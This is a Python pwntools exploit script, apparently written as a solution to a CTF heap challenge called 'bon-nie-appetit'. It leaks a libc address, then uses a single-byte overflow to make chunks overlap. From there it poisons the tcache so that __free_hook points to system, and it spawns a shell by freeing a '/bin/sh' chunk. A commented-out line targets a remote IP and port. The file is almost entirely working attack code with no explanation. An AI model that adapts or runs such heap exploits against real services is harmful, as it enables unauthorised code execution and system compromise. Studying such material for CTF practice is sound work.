#!/usr/bin/env python3

from pwn import *

exe = ELF("./bon-nie-appetit_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
#p = remote('83.136.252.14',35324)
gdb.attach(p,gdbscript='''
           b*new_order+127
           b*new_order+211
           b*edit_order+215
           b*delete_order+156
           b*show_order+123
           b*edit_order+173
           ''')


def make(a,content):
    p.sendlineafter(b'> ',b'1')
    p.sendafter(b'For how many: ',a)
    p.sendafter(b'What would you like to order: ',content)
def show(idx):
    p.sendlineafter(b'> ',b'2')
    p.sendafter(b'Number of order: ',idx)
def edit(number,order):
    p.sendlineafter(b'> ',b'3')
    p.sendafter(b'Number of order: ',number)
    p.sendafter(b'New order: ',order)

def free(number):
    p.sendlineafter(b'> ',b'4')
    p.sendafter(b'order: ',number)




make(str(0x450),b'cccc')
make(str(0x100),b'aaaa')
free(str(0))
make(str(0x450),b'a')
show(str(0))
p.recvuntil(b'=> ')

leak = u64(p.recv(6).ljust(8,b'\x00')) + 0x3f
libc.address = leak - 0x3ebca0
log.info(f"leak libc: {hex(libc.address)}")

make(str(0x48),b'a'*0x48)  #2
make(str(0x48),b'c'*0x48)  #3 
make(str(0x48),b'd'*0x48)  #4
free(str(4))
edit(str(2),b'a'*0x48 + b'\x81')
free(str(3))

input()
make(str(0x78),b'a'*0x48 + p64(0x51) + p64(libc.sym.__free_hook))
make(str(0x48),b'haha')
make(str(0x48),p64(libc.sym.system))

make(str(0x28),b'/bin/sh\x00')
free(str(5))

p.interactive()
